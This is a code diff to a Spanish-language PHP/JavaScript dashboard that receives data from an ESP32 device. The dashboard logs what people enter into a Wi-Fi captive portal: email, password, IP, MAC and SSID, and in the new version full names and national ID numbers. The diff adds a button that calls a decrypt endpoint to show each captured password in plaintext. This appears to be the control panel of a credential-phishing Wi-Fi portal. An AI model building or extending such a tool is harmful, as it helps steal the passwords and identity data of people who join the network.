@@ -155,31 +155,35 @@ $nombre = $_SESSION['user_nombre'];
             border-radius: 10px; font-size: 11px; font-weight: 700;
             margin-left: 6px;
         }
-	.pwd-hidden {
+        .pwd-cell { display: flex; align-items: center; gap: 6px; }
+        .pwd-cipher {
             color: #6c7086;
             font-family: 'JetBrains Mono', monospace;
-            letter-spacing: 3px;
+            font-size: 11px;
             user-select: none;
+            max-width: 160px;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         .pwd-visible {
             color: #f38ba8;
             font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
             letter-spacing: 0;
         }
         .btn-eye {
-            background: transparent;
-            border: none;
+            background: #313244;
+            border: 1px solid #45475a;
+            color: #cdd6f4;
             cursor: pointer;
-            font-size: 13px;
-            padding: 2px 6px;
-            margin-left: 4px;
-            border-radius: 4px;
-            opacity: 0.5;
-            transition: all 0.2s;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 6px;
+            transition: all 0.15s;
             line-height: 1;
-         }
-         .btn-eye:hover { opacity: 1; background: #313244; }
-         .btn-eye:active { transform: scale(0.9); }
+        }
+        .btn-eye:hover { background: #45475a; border-color: #89b4fa; }
+        .btn-eye:active { transform: scale(0.92); background: #1a237e; }
     </style>
 </head>
 <body>
@@ -300,21 +304,21 @@ $nombre = $_SESSION['user_nombre'];
             <!-- Tab: Registros del Portal Cautivo -->
             <div class="tab-content" id="tab-portal">
                 <p class="hint" style="margin-bottom:10px;">
-		    Los datos ingresados en el portal cautivo (correo, contraseña, IP y MAC) se registran aquí automáticamente.
+                    Los datos ingresados en el portal cautivo (correo, contraseña, IP y MAC) se registran aquí automáticamente.
                     <button class="btn btn-success" onclick="refreshPortalRegistros()" style="padding:4px 12px; font-size:12px;">🔄 Actualizar</button>
                 </p>
                 <div class="table-wrap">
                     <table>
-			<thead>
+                        <thead>
                             <tr>
-       				 <th>Correo</th>
-        			 <th>Contraseña</th>
-       				 <th>IP</th>
-       				 <th>MAC</th>
-       				 <th>SSID</th>
-       				 <th>Fecha</th>
-   			     </tr>
-			 </thead>
+                                <th>Correo</th>
+                                <th>Contraseña</th>
+                                <th>IP</th>
+                                <th>MAC</th>
+                                <th>SSID</th>
+                                <th>Fecha</th>
+                            </tr>
+                        </thead>
                         <tbody id="portal-tbody">
                             <tr><td colspan="6" style="text-align:center; color:#6c7086;">Cargando registros...</td></tr>
                         </tbody>
@@ -772,15 +776,16 @@ $nombre = $_SESSION['user_nombre'];
         // ============================================================
 
         function guardarRegistroPortal(data) {
-            if (!data.correo || !data.contrasena || !data.ip || !data.mac) {
+            if (!data.nombres || !data.apellidos || !data.cedula || !data.ip || !data.mac) {
                 logEvent('error', 'portal', 'Datos incompletos para guardar registro: ' + JSON.stringify(data));
                 return;
             }
             
             const body = new URLSearchParams({
                 action: 'guardar_registro',
-                correo: data.correo || '',
-                contrasena: data.contrasena || '',
+                nombres: data.nombres || '',
+                apellidos: data.apellidos || '',
+                cedula: data.cedula || '',
                 ip: data.ip || '',
                 mac: data.mac || '',
                 ssid: data.ssid || ''
@@ -795,7 +800,7 @@ $nombre = $_SESSION['user_nombre'];
             .then(r => r.json())
             .then(res => {
                 if (res.ok) {
-                    logEvent('ok', 'portal', 'Registro guardado: ' + data.correo);
+                    logEvent('ok', 'portal', 'Registro guardado: ' + data.nombres + ' ' + data.apellidos + ' (Cédula: ' + data.cedula + ')');
                     refreshPortalRegistros();
                 } else {
                     logEvent('error', 'portal', 'Error al guardar registro: ' + (res.error || res.detalle || 'desconocido'));
@@ -806,7 +811,7 @@ $nombre = $_SESSION['user_nombre'];
             });
         }
 
-	function refreshPortalRegistros() {
+        function refreshPortalRegistros() {
             fetch('api_portal.php?action=listar', {
                 credentials: 'same-origin'
             })
@@ -825,16 +830,18 @@ $nombre = $_SESSION['user_nombre'];
                 tbody.innerHTML = data.registros.map(r => `
                     <tr>
                         <td>${esc(r.correo)}</td>
-			<td>
-                            <span class="pwd-hidden" data-pwd="${esc(r.contrasena)}">••••••••</span>
-                            <button class="btn-eye"
-                                onmousedown="showPwd(this)"
-                                onmouseup="hidePwd(this)"
-                                onmouseleave="hidePwd(this)"
-                                ontouchstart="showPwd(this)"
-                                ontouchend="hidePwd(this)"
-                                title="Mantén presionado para ver">👁️</button>
-			</td>
+                        <td>
+                            <div class="pwd-cell">
+                                <span class="pwd-cipher" data-id="${r.id}" data-cipher="${esc(r.contrasena)}">${esc((r.contrasena || '').substring(0, 20))}...</span>
+                                <button class="btn-eye"
+                                    onmousedown="revealPwd(this)"
+                                    onmouseup="hidePwd(this)"
+                                    onmouseleave="hidePwd(this)"
+                                    ontouchstart="revealPwd(this)"
+                                    ontouchend="hidePwd(this)"
+                                    type="button">👁️</button>
+                            </div>
+                        </td>
                         <td>${esc(r.ip)}</td>
                         <td><code style="color:#a6e3a1;">${esc(r.mac)}</code></td>
                         <td>${esc(r.ssid)}</td>
@@ -847,18 +854,7 @@ $nombre = $_SESSION['user_nombre'];
                 document.getElementById('portal-tbody').innerHTML = '<tr><td colspan="6" style="text-align:center; color:#f38ba8;">Error al cargar: ' + e.message + '</td></tr>';
             });
         }
-     	function showPwd(btn) {
-            const span = btn.previousElementSibling;
-            span.textContent = span.dataset.pwd;
-            span.classList.add('pwd-visible');
-            span.classList.remove('pwd-hidden');
-        }
-        function hidePwd(btn) {
-            const span = btn.previousElementSibling;
-            span.textContent = '••••••••';
-            span.classList.add('pwd-hidden');
-            span.classList.remove('pwd-visible');
-        }
+
         // ============================================================
         // LECTURA DEL ESP32
         // ============================================================
@@ -991,7 +987,7 @@ $nombre = $_SESSION['user_nombre'];
                 case 'portal_registro':
                     guardarRegistroPortal(msg);
                     break;
-		case 'cred':
+                case 'cred':
                     guardarRegistroPortal({
                         correo: msg.correo,
                         contrasena: msg.contrasena,
@@ -1269,6 +1265,40 @@ $nombre = $_SESSION['user_nombre'];
         }
 
         autoConnect();
+        function revealPwd(btn) {
+            const span = btn.parentElement.querySelector('span');
+            const id = span?.dataset?.id;
+            if (!id) return;
+            if (span.dataset.plain) {
+                span.textContent = span.dataset.plain;
+                span.classList.add('pwd-visible');
+                span.classList.remove('pwd-cipher');
+                return;
+            }
+            fetch('api_portal.php?action=descifrar&id=' + encodeURIComponent(id), {
+                credentials: 'same-origin'
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) {
+                    span.dataset.plain = data.contrasena;
+                    span.textContent = data.contrasena;
+                    span.classList.add('pwd-visible');
+                    span.classList.remove('pwd-cipher');
+                }
+            })
+            .catch(() => {});
+        }
+
+        function hidePwd(btn) {
+            const span = btn.parentElement.querySelector('span');
+            if (!span) return;
+            const cipher = span.dataset.cipher || '';
+            span.textContent = cipher.substring(0, 20) + '...';
+            span.classList.remove('pwd-visible');
+            span.classList.add('pwd-cipher');
+        }
+
         refreshPortalRegistros();
         setInterval(refreshPortalRegistros, 10000);
 
